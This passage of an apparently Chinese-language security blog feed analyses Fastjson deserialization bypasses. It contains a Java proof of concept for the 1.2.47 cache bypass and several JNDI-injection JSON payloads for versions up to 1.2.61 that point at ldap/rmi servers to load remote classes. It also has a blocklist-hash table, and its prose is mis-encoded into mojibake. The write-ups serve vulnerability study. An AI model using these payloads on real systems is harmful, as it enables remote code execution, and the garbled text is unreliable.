alt="image-20230828000800194"><br>ÁªßÁª≠Ë∞ÉËØï‰∏Ä‰∏ãÔºåÂú®ËøôÈáåÂ∞±ÂèØ‰ª•ÁªìÂêàÁùÄÁªÑÈïøÁöÑÈÇ£‰∏™ÂõæÊù•ÂàÜÊûê‰∫Ü</p><ul><li><p>Âú®Á¨¨‰∏Ä‰∏™‰∏≠ÔºåÂõ†‰∏∫Âú®ÁôΩÂêçÂçï‰∏≠ÊâçËÉΩÂ§üËøõË°åÁºìÂ≠òÔºåÊâÄ‰ª•ËøôÈáå‰∏çÁ¨¶ÂêàË¶ÅÊ±ÇÔºåÁ¨¨‰∏â‰∏™ÂêåÁêÜ</p></li><li><p>Âú®Á¨¨‰∫å‰∏™ËøîÂõûÁ±ªÂΩì‰∏≠ÔºåÊúüÊúõÁ±ª‰∏∫Á©∫‰∏îÁ±ª‰∏éÊúüÊúõÁ±ª‰∏ÄËá¥ÁöÑÊó∂ÂÄôËøîÂõûÁ±ªÔºåËøôÈáåÊàë‰ª¨ÁöÑÊúüÊúõÁ±ª‰∏∫Á©∫ÔºåÊâÄ‰ª•ËøôÈáåËÉΩÂ§üÁ¨¶ÂêàÊù°‰ª∂ÔºåÊâÄ‰ª•Êàë‰ª¨Âú®ÂæÄ‰∏äÊâæÔºåÂè™Ë¶ÅÁºìÂ≠ò‰∏≠Â≠òÂú®Á±ªÔºåÊàë‰ª¨Â∞±ËÉΩÂ§üËøõË°åÂä†ËΩΩ„ÄÇ</p></li><li><p>Á¨¨Âõõ‰∏™ÊòØÂü∫‰∫éÊúüÊúõÁ±ªÁöÑÔºåÂõ†‰∏∫ËøôÈáåÂíåÊúüÊúõÁ±ªÂπ∂Êó†ÂÖ≥ÊâÄ‰ª•‰πüÊª°Ë∂≥‰∏ç‰∫Ü</p></li><li><p>ËøõÂÖ•falseÊù•Âà∞Á¨¨‰∫î‰∏™ÔºåÂèàÂõ†‰∏∫ÈªòËÆ§ÊÉÖÂÜµ‰∏ãAutoType‰∏∫falseÔºåÊâÄ‰ª•‰πüÂä†ËΩΩ‰∏ç‰∫Ü<br>ÊâÄ‰ª•Áé∞Âú®Â∞±Âú®ÁºìÂ≠òËøôÂùó‰∏ãÂäüÂ§´ÔºåÁúã‰∏Ä‰∏ãÂ¶Ç‰ΩïÂú®ÁºìÂ≠òÈáåÈù¢ÊâæÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÁ±ªÔºåËøô‰∏ÄÂùóÂÑøÁöÑÊµÅÁ®ãÂ¶Ç‰∏ãÂõæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008433.png" alt="image-20230828000816375"><br>Áî±‰∫éAutoType‰∏∫falseÊâÄ‰ª•‰∏ç‰ºöËøõÂÖ•Á¨¨‰∏ÄËΩÆÁöÑÈªëÂêçÂçïÊ£ÄÊµãÊù•Âà∞<code>TypeUtils.getClassFromMapping</code>Ë∑üËøõÊù•ÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008797.png" alt="image-20230828000829713"><br>ÂèëÁé∞ÊòØ‰ªémappingsÈáåÈù¢ÊâæÁºìÂ≠òÔºåÁÑ∂Âêéfind uagesÁúãÁúãmappings‰ªÄ‰πàÊó∂ÂÄôËµãÂÄºÔºåÂ§çÁé∞ËøõË°åËµãÂÄºÁöÑÂú∞ÊñπÂæàÂ§öÔºå‰ΩÜÊòØÂ§ßÂ§öÊòØÊåáÂÆö‰∫Ü‰∏Ä‰∫õÂü∫Á°ÄÁ±ªËøõË°åÁöÑÁºìÂ≠òËÄåloadClassËøôÈáåÂè™Ë¶ÅÊàë‰ª¨Âä†ËΩΩÁ±ªÊàêÂäü‰ª•ÂêéÔºå‰ªñÂ∞±‰ºöÊîæÂÖ•ÁºìÂ≠ò‰∏≠Ôºå‰∏ãÊ¨°Ë∞ÉÁî®Áõ¥Êé•‰ªéÁºìÂ≠ò‰∏≠ËøõË°åÂä†ËΩΩÔºåËøôÈáåÊàë‰ª¨Â∞±Ë¶ÅÊÉ≥ÊÄé‰πàÊâçËÉΩÂ§üÂú®loadClassÁöÑÊó∂ÂÄôÂ∞ÜÊàë‰ª¨ÁöÑÁ±ªÂä†ËΩΩÂÖ•ÁºìÂ≠òÂΩì‰∏≠<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008627.png" alt="image-20230828000844112"><br>ÁÑ∂ÂêéÁªßÁª≠ÂØªÊâæloadClassÁöÑË∞ÉÁî®ÔºåÊúÄÁªàÊòØÊâæÂà∞‰∫ÜMiscCodecËøô‰∏™Á±ªÔºå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÊàëfind uagesÁöÑÊó∂ÂÄôÊâæ‰∏çÂà∞ÔºåÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008818.png" alt="image-20230828000858293"><br>Ê≤°ÂäûÊ≥ïÂè™ËÉΩÊâãÂä®ËøõÂÖ•‰∫ÜÔºåÂú®<code>MiscCodec.deserialze()</code>‰∏≠ËøõË°åË∞ÉÁî®Â¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009792.png" alt="image-20230828000915703"><br>Áé∞Âú®Êù•ÁúãÁúãËøô‰∏™MiscCodecÊòØ‰∏™‰ªÄ‰πàÔºåÂèëÁé∞ÂÆÉÂÆûÁé∞‰∫ÜÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÁöÑÊé•Âè£Âú®fastJsonÁöÑÂèçÂ∫èÂàóÂåñ‰∏≠‰πü‰ºöÊää‰ªñÂΩì‰ΩúÂèçÂ∫èÂàóÂåñÂô®Êù•ËøõË°åË∞ÉÁî®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009894.png" alt="image-20230828000925778"><br>ÊâÄ‰ª•Â¶ÇÊûúFastJsonÂèçÂ∫èÂàóÂåñÁöÑÁ±ªÊòØÂ±û‰∫éClass.classÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºöË∞ÉÁî®MiscCodecÂèçÂ∫èÂàóÂåñÂô®ÔºåÁÑ∂ÂêéË∞ÉÁî®loadClassÔºåÂú®‰º†ÂÖ•Êàë‰ª¨ÊÉ≥‰º†ÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤strValÂêéloadClassÂ∞±‰ºöÂ∞ÜÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫String classNameËøõË°åÂä†ËΩΩÂπ∂ÊîæÂú®ÁºìÂ≠òÈáåÈù¢„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009849.png" alt="image-20230828000938335"><br>ÁÑ∂ÂêéËøôÈáåÁöÑÊúâ‰∏™Ê£ÄÊµãË¶ÅÊª°Ë∂≥‰∏çÁÑ∂Â∞±‰ºöÊäõÂºÇÂ∏∏ÔºåÂç≥strValÁöÑÈîÆÊòØÂê¶‰∏∫valÊòØÁöÑËØùÂÜçÊèêÂèñÂÆÉÁöÑÂÄº<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009092.png" alt="image-20230828000951923"><br>ÁÑ∂ÂêéËµãÂÄºÂà∞objVal‰∏ä<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010262.png" alt="image-20230828001004053"><br>ÊúÄÂêéËµãÂÄºÁªôstrVal<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010150.png" alt="image-20230828001017952"><br>ÁÑ∂ÂêéÂú®ÁºìÂ≠òÈáåÈù¢ÊâæÂà∞<code>com.sun.rowset.JdbcRowSetImpl</code>ËøîÂõûclazz<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010162.png" alt="image-20230828001032000"><br>ÊúÄÁªàÁöÑexpÔºåËøô‰∏™ÁöÑpayload‰∏§Ê¨°ÊµÅÁ®ãÂæóÂÜôÂú®‰∏ÄËµ∑‰∏ÄÊ¨°ÊÄßÂÆåÊàê‰∏çÁÑ∂Â∞±ËØªÂèñ‰∏çÂà∞ÁºìÂ≠ò‰∫ÜÔºåÂÜôÊ≥ïÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.MiscCodec;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass47</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280011388.png" alt="image-20230828001101946"><br>ËÄåÂú®1.2.48ÁâàÊú¨‰∏≠ÁºìÂ≠òÂºÄÂÖ≥cacheÈªòËÆ§ËÆæÁΩÆ‰∏∫‰∫ÜFalseÔºåËøô‰∏™Â∞±‰∏çË°å‰∫ÜÔºåÂêåÊó∂Ëøô‰∏™ÊñπÊ≥ïÂú®47ÂèäÂâçÈù¢ÁöÑÁâàÊú¨Âà©Áî®‰πüÂàÜ‰∏∫‰∫Ü‰∏§ÊÆµ</p></li><li><p>1.2.25-1.2.32ÁâàÊú¨ÔºöÊú™ÂºÄÂêØAutoTypeSupportÊó∂ËÉΩÊàêÂäüÂà©Áî®ÔºåÂºÄÂêØAutoTypeSupportÂèçËÄå‰∏çËÉΩÊàêÂäüËß¶ÂèëÔºõ</p></li><li><p>1.2.33-1.2.47ÁâàÊú¨ÔºöÊó†ËÆ∫ÊòØÂê¶ÂºÄÂêØAutoTypeSupportÔºåÈÉΩËÉΩÊàêÂäüÂà©Áî®Ôºõ</p></li></ul><h2 id="Fastjson-lt-x3D-1-2-61-ÈÄöÊùÄ"><a href="#Fastjson-lt-x3D-1-2-61-ÈÄöÊùÄ" class="headerlink" title="Fastjson &lt;&#x3D; 1.2.61 ÈÄöÊùÄ"></a>Fastjson &lt;&#x3D; 1.2.61 ÈÄöÊùÄ</h2><p>Ëøô‰∏™Â∞±ËÆ∞ÂΩï‰∏Ä‰∏ãpayloadÂêßÔºåÊáíÂæóË∑ü‰∫ÜÔºåÁúãËµ∑Êù•ÂÉèÊòØÈªëÂêçÂçïÁöÑÁªïËøá</p><h3 id="Fastjson1-2-5-lt-x3D-1-2-59"><a href="#Fastjson1-2-5-lt-x3D-1-2-59" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.59"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.59</h3><p><strong>ÈúÄË¶ÅÂºÄÂêØAutoType</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-x3D-1-2-60"><a href="#Fastjson1-2-5-lt-x3D-1-2-60" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.60"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.60</h3><p><strong>Êó†ÈúÄÂºÄÂêØ autoTypeÔºö</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="string">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="string">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-x3D-1-2-61"><a href="#Fastjson1-2-5-lt-x3D-1-2-61" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.61"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.61</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploi</span></span><br></pre></td></tr></table></figure><h2 id="Â∑≤Áü•ÂìàÂ∏åÈªëÂêçÂçï"><a href="#Â∑≤Áü•ÂìàÂ∏åÈªëÂêçÂçï" class="headerlink" title="Â∑≤Áü•ÂìàÂ∏åÈªëÂêçÂçï"></a>Â∑≤Áü•ÂìàÂ∏åÈªëÂêçÂçï</h2><p>ÁõÆÂâçÂ∑≤Áü•ÁöÑÂìàÂ∏åÈªëÂêçÂçïÁöÑÂØπÂ∫îË°®Â¶Ç‰∏ãÔºö</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr></tbody></table><p>ÁõÆÂâçÊú™Áü•ÁöÑÂìàÂ∏åÈªëÂêçÂçïÔºö</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>33238344207745342</td><td>0x761619136cc13eL</td><td></td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td></td></tr><tr><td>1.2.62</td><td>-5472097725414717105</td><td>0xb40f341c746ec94fL</td><td></td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td></td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td></td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td></td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td><td></td></tr></tbody></table><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p><a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#0x08-1-2-25-1-2-47%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87">JavaÂèçÂ∫èÂàóÂåñFastjsonÁØá03-FastjsonÂêÑÁâàÊú¨ÁªïËøáÂàÜÊûê | Drunkbaby‚Äôs Blog (drun1baby.top)</a><br><a href="http://blog.topsec.com.cn/fastjson%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%EF%BC%88%E4%B8%80%EF%BC%89/">FastjsonÂéÜÂè≤ÊºèÊ¥ûÁ†îÁ©∂Ôºà‰∏ÄÔºâ | Â§©Ëûç‰ø°ÈòøÂ∞îÊ≥ïÂÆûÈ™åÂÆ§ (topsec.com.cn)</a><br><a href="https://xz.aliyun.com/t/12728#toc-9">JavaÂèçÂ∫èÂàóÂåñ‰πãFastJsonÂèçÂ∫èÂàóÂåñÂèäÁªïËøá - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a><br><a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.24Âà©Áî®ÈìæÂàÜÊûê</title>
      <link href="/2023/08/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BFastjson1-2-24%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BFastjson1-2-24%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>pom.xml‰æùËµñÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    